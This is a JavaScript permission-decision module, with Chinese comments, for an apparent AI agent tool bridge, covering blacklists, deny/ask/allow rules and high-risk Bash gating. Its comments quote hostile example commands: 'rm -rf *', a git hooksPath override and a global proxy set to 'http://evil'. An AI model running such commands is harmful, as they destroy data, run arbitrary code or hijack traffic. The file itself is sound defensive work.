// Ponos-turbo 工具权限判定（docs/bridge-contract.md §4 can_use_tool 协议）
// ---------------------------------------------------------------------------
// 净室语义：--dangerously-skip-permissions 使低危工具自动执行；Bash 高危命令
// 仍发 can_use_tool control_request 挂起，经 GUI 审批（approval 事件）后以
// control_response 解除。这保证 GUI 审批弹窗工作流（契约 §5 approval）可用。
// headless 场景（benchmark/CI 无审批者）：--auto-approve-high-risk 与
// skipPermissions 同时开启时，高危命令也自动放行，避免永久挂起。
// S3-1：--permission-rules-file 的显式规则优先于默认判定，优先级 deny > ask > allow。
import { matchesHighRisk } from './highrisk.mjs'
import { matchesCatastrophic, CATASTROPHIC_REASON } from './blacklist.mjs'
import { classifyTool, modeAllows, deriveApprovalMode, normalizeApprovalMode } from './approval-mode.mjs'
// ★ P2b（2026-10-15）：输入 act 的判据取自**契约真源** —— 本文件不另写一份 act 名单
//   （本仓两次踩过"同一份名单抄两遍"：CHAT_MODE_DISALLOWED 漏 Screen、排除清单两侧 trim 不一致）。
import { isInputAct } from '../shared/screen-contract.cjs'

// S3-1 规则匹配：条目 Tool:pattern（pattern 支持 * 通配）。Bash 匹配命令文本；
// 非 Bash 仅 "Tool:*"（全工具）与精确工具名命中。
function patternToRegExp(pattern) {
  return new RegExp('^' + pattern.replace(/[.+^${}()|[\]\\]/g, '\\$&').replace(/\*/g, '.*') + '$', 'i')
}
function matchRule(rule, toolName, command) {
  const idx = String(rule).indexOf(':')
  if (idx < 0) return false
  const t = rule.slice(0, idx).trim()          // ★ 见下方说明：两侧都要 trim
  const pattern = rule.slice(idx + 1).trim()   // ★ 2026-10-18 修复（见 matchList 上方注释）
  if (t !== toolName) return false
  if (pattern === '*') return true
  if (toolName === 'Bash' && command) return patternToRegExp(pattern).test(command.trim())
  return false
}

/**
 * `allow-high-risk:` 前缀 —— **显式**允许该规则连高危形式一起放行的逃生口（AI-02，2026-10-18）。
 *
 * 为什么需要逃生口：没有它，用户想自动放行某类高危命令时（CI 里跑 migrate、批量改 config），
 * 唯一表达方式是开 bypass / skipPermissions —— 那是**整片关掉**，比一条窄规则危险得多。
 * 有逃生口的前提下，"高危默认要问"才站得住。
 *
 * 形态：`allow-high-risk: Bash: git *`（前缀可与其他修饰共存，前缀本身不参与匹配）。
 */
const HIGH_RISK_ALLOW_PREFIX = 'allow-high-risk:'

/*
 * ★★ 2026-10-18 顺带修复（与 AI-02 同处、同主题：**规则必须按字面生效**）：
 *   原来 `pattern = rule.slice(idx + 1)` **不 trim**，于是最自然的写法
 *   `Bash: git status`（冒号后带一个空格）会得到 pattern `" git status"`，
 *   编译成 `^ git status$` —— **永远匹配不上**。
 *
 *   这个静默失败的**危险方向在 deny 上**：
 *     `deny: ['Bash: rm -rf *']` 带空格 ⇒ 规则不生效 ⇒ rm -rf 照常放行，
 *     而用户以为自己已经禁掉了（比"没配规则"更糟：它给人**虚假的安全感**）。
 *   在 allow 上则是让人以为放行了却不生效，体验差但安全。
 *
 *   ⇒ 两侧都 trim。副作用要说清：**此前写了带空格规则的配置会从"静默无效"变为"真正生效"**。
 *     allow 侧因此可能放行更多 —— 但有 AI-02 的修复兜底（高危形式仍然要问），
 *     且这本来就是用户写规则时的真实意图。
 */

/** 规则是否为显式放宽高危（用于 matchList 的 highRiskOnly 过滤） */
function isHighRiskAllowRule(rule) {
  return String(rule).trim().startsWith(HIGH_RISK_ALLOW_PREFIX)
}

/** 把 `allow-high-risk:` 前缀剥掉，得到可正常匹配的规则串 */
function stripHighRiskPrefix(rule) {
  const s = String(rule).trim()
  return s.startsWith(HIGH_RISK_ALLOW_PREFIX) ? s.slice(HIGH_RISK_ALLOW_PREFIX.length).trim() : s
}

function matchList(list, toolName, command, opts = {}) {
  for (const rule of list || []) {
    // highRiskOnly：只匹配"显式放宽"的那类规则；不带该选项时**跳过**它们，
    // 避免放宽规则在普通路径上被误当成普通 allow（那样等于静默恢复旧缺陷）。
    const isRelaxed = isHighRiskAllowRule(rule)
    if (opts.highRiskOnly === true && !isRelaxed) continue
    if (opts.highRiskOnly !== true && isRelaxed) continue
    const effective = isRelaxed ? stripHighRiskPrefix(rule) : rule
    if (matchRule(effective, toolName, command)) return rule
  }
  return null
}

// 权限决策：
//   { decision: 'allow' }                    —— 自动执行
//   { decision: 'ask' }                      —— 发 can_use_tool 挂起等回执
//   { decision: 'deny' }                     —— 直接拒绝（不执行）
//   { decision: 'ask', hard: true }          —— 硬黑名单（灾难命令）：任何档位都必须经用户确认，
//                                               引擎侧据此跳过度降级计数（2026-09-12 档位化）
//   { decision: 'ask', askOncePerRun: true } —— P2b 输入动作（Screen 的真实键鼠）：任何档位都必须问，
//                                               但**一次运行只问一次**（引擎侧运行级记忆，见 engine.mjs）
// 判定顺序（不可调换）：
//   ① 硬黑名单 —— 底线，先于显式规则（allow 规则也不得放开 rm -rf /）
//   ② 显式规则 deny —— 用户的显式拒绝永远赢
//   ②-b P2b 输入动作 —— 与灾难级同级的"任何档位都不静默放行"，但频次是"每次运行一次"
//   ③ 显式规则 ask / allow
//   ④ 高危 Bash —— 仅 bypass 档自动放行
//   ⑤ 档位表 —— 只读/普通命令/写文件/出网/agent 各档不同阈值（approval-mode.mjs）
// mode 缺省时按旧 flag 派生（deriveApprovalMode）→ 不传档位的既有调用方行为不变。
/**
 * @param {{ toolName?: any, input?: any, skipPermissions?: any, autoApproveHighRisk?: any, rules?: any, mode?: any }} opts
 */
export function decideToolPermission({ toolName, input, skipPermissions, autoApproveHighRisk, rules = {}, mode = null }) {
  const command = toolName === 'Bash' ? String(input?.command ?? '') : ''
  // ① 硬黑名单（灾难级）：四档都问，且不给"下次自动放过"的机会
  if (toolName === 'Bash' && matchesCatastrophic(command)) {
    return { decision: 'ask', hard: true, reason: `${CATASTROPHIC_REASON}：${command.slice(0, 80)}` }
  }
  // ② S3-1 显式规则优先：deny > ask > allow；命中即定，不再走默认判定
  const denied = matchList(rules.deny, toolName, command)
  if (denied) return { decision: 'deny', reason: `权限规则 deny 命中：${denied}` }
  // ②-b P2b 输入类动作（Screen 的 move/clickAt/drag/scroll/keyCombo）：**四档都问**。
  //   放在**档位判定之前**是必须的 —— 归入档位表会让 bypass 档自动放行（TOOL_CLASS_ALLOW_FROM.appTool='bypass'），
  //   而鼠标点击点是"当时前台那个窗口的那个位置"，可能点到邮件发送/转账确认，**不可逆**（比 Bash 更甚：
  //   Bash 至少显式声明了它要做什么）。故与灾难级同级：任何档位都不静默放行。
  //   ★ 但**不复用 `hard`**：hard 的语义是"每次都问 + 弹灾难级警示条"，与"一次运行只问一次"冲突
  //   （用户 2026-10-15 裁决：每批次运行只询问一次）。用独立的 `askOncePerRun`。
  //   ★ 位置：**deny 规则之后**（用户的显式拒绝是更严的约束，必须仍然赢；这也是既有基线
  //     `kernel-tests/screen-approval.test.mjs` 钉着的 `deny > 档位` 事实），
  //     **ask/allow 规则之前**（与灾难级先例同理：allow 规则不得把真实键鼠静默放开；
  //     而 ask 规则若不在此让位，输入动作就会退化成"每个动作都问"，违反裁决 3）。
  //   ★ 判据来自契约真源 `isInputAct`（大小写不敏感、驼峰 act 已建索引）—— 不在此另写名单。
  if (toolName === 'Screen' && isInputAct(input?.action)) {
    return {
      decision: 'ask',
      askOncePerRun: true,
      reason: '该动作会真实驱动你的鼠标/键盘（作用于目标窗口）：批准后本次运行内同类动作不再询问；下次运行会重新询问',
    }
  }
  const asked = matchList(rules.ask, toolName, command)
  if (asked) return { decision: 'ask', reason: `权限规则 ask 命中：${asked}` }

  // ★★ 2026-10-18 AI-02 修复：**高危判定提到 allow 之前**。
  //
  // 原顺序是 `allow 命中即 return` → 然后才判高危 ⇒ 一条**看起来无害的宽规则**
  // 会把高危形式一起放行。实测（`Bash: git *` + 下面两条）：
  //   · `git -c core.hooksPath=/tmp/x status`      —— 覆盖 hooks 目录，后续 git 操作执行任意钩子
  //   · `git config --global http.proxy http://evil` —— 改全局代理，劫持后续所有 git 流量
  // 两条都被**静默 allow**。这是真正危险的地方：用户配 allow 的心智模型是
  // "放行我确认过的那类命令"，而 `matchesHighRisk` 判的恰恰是"这条命令的高危形式"。
  //
  // ★ 但必须有**显式逃生口**，否则在实践中会被绕过得更狠：
  //   用户真想自动放行某类高危命令时（CI 里跑 migrate 之类），若没有表达方式，
  //   只能去开 bypass / skipPermissions —— 那是**整片关掉**，比一条窄规则危险得多。
  //   故支持 `allow-high-risk: <pattern>` 前缀（或规则项本身就是对象且 highRisk:true）。
  //   命中逃生口时 reason 必须标明"规则已放宽"，让审批卡/日志能如实告知。
  if (toolName === 'Bash' && matchesHighRisk(command)) {
    const relaxed = matchList(rules.allow, toolName, command, { highRiskOnly: true })
    if (relaxed) {
      return {
        decision: 'allow',
        reason: `权限规则已放宽（allow-high-risk）命中：${relaxed} —— 该规则显式允许高危形式`,
        relaxedByRule: relaxed,
      }
    }
    // 非逃生口的 allow 规则在此**不得生效**：继续往下走到档位判定，
    // 由档位决定（bypass 仍可自动放行，那是用户的显式选择，且是全局而非"某条规则顺手带过"）。
    const ordinary = matchList(rules.allow, toolName, command)
    if (ordinary) {
      // 明确告知：规则本来会放行，但因为命中高危被降级为询问。
      // 不静默：否则用户会以为规则坏了。
      const m0 = mode ? normalizeApprovalMode(mode) : deriveApprovalMode({ skipPermissions, autoApproveHighRisk })
      if (modeAllows(m0, 'highRiskBash')) return { decision: 'allow', reason: `高危操作，但当前档位「${m0}」允许自动放行` }
      return {
        decision: 'ask',
        reason: `命令为高危操作（规则 ${ordinary} 本会放行，但高危形式需你确认）：${command.slice(0, 80)}`,
        downgradedByHighRisk: true,
      }
    }
    const m1 = mode ? normalizeApprovalMode(mode) : deriveApprovalMode({ skipPermissions, autoApproveHighRisk })
    if (modeAllows(m1, 'highRiskBash')) return { decision: 'allow' }
    return { decision: 'ask', reason: `命令为高危操作，需要用户批准：${command.slice(0, 80)}` }
  }

  const allowed = matchList(rules.allow, toolName, command)
  if (allowed) return { decision: 'allow', reason: `权限规则 allow 命中：${allowed}` }
  // ③④ 档位判定
  const m = mode ? normalizeApprovalMode(mode) : deriveApprovalMode({ skipPermissions, autoApproveHighRisk })
  // ★ P2b（2026-10-15）：把 `input` 一并交给分类器 —— `Screen` 要**按 act** 判定
  //   （只读 act ⇒ read 不打扰；输入 act ⇒ appTool 逐次 ask）。本函数的 `input` 参数一直在作用域内
  //   （见签名），此前只是没往下传；分类器对"缺 input"的取向是保守（当输入处理），
  //   故这里即便拿到 undefined 也不会静默放行。
  if (modeAllows(m, classifyTool(toolName, input))) return { decision: 'allow' }
  return { decision: 'ask', reason: `当前审批档位「${m}」下 ${toolName} 需要用户批准` }
}
